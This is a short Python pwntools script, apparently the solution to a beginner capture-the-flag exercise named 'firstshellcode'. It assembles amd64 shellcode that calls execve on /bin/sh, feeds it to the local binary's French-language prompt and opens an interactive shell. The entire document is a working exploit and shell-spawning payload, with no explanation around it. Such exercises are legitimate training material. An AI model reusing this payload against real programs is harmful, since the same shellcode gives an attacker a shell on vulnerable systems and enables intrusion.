from pwn import *

exe = ELF('./firstshellcode')
context.arch = 'amd64'

def conn():
    if args.GDB:
        return gdb.debug(exe.path)
    else:
        return process(exe.path)

shellcode = asm('''
    mov rsi, 0
    mov rdx, 0
    mov rcx, 0x68732f6e69622f
    push rcx
    mov rdi, rsp
    mov rax, 59
    syscall
''')

io = conn()
io.sendafter(b"Entrez votre shellcode : ", shellcode)
io.interactive()